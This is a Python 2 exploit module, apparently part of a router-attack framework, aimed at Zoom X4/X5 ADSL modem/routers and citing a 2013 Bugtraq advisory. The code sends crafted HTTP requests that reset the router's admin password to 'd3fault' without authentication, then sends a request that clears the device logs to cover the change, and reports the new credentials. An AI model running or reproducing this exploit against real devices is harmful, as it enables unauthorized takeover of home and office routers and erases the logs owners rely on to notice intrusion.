from ..router_vuln import RouterVuln
import util
import urllib


class x4_5_mod_password(RouterVuln):
    """ Modify the administrative password to 'd3fault'
        http://seclists.org/bugtraq/2013/Jul/56
    """
    def __init__(self):
        self.router = 'X4/X5 ADSL Modem/Router <=2.5 and 3.0'
        self.vuln   = 'Change Admin Password'
        super(x4_5_mod_password, self).__init__()

    def run(self):
        version = util.get_input('Enter Zoom version [2/3]: ')
        util.Msg('Changing admin password to \'d3fault\'...')

        url_25 = 'http://%s/hag/emweb/PopOutUserModify.htm/FormOne&user=admin&'\
                 'ex_param1=admin&new_pass1=d3fault&new_pass2=d3fault&id=3&'\
                 'cmdSubmit=Save+Changes' % self.ip
        url_30 = 'http://%s/hag/emweb/PopOutUserModify.htm?id=40&user=admin&'\
                 'Zadv=1&ex_param1=admin&new_pass1=d3fault&new_pass2=d3fault&'\
                 'id=3&cmdSubmit=Save+Changes' % self.ip
        url_logs = 'http://%s/Action?id=76&cmdClear+Log=Clear+Log' % self.ip

        try:
            if version == '2':
                urllib.urlopen(url_25).read()
            else:
                urllib.urlopen(url_30).read()

            util.Msg("Password reset, clearing logs...")
            urllib.urlopen(url_logs).read()
            util.Msg('Done.  Connect to %s with admin:d3fault' % self.ip)
        except Exception, e:
            util.Error('Unable to connect: %s' % e)
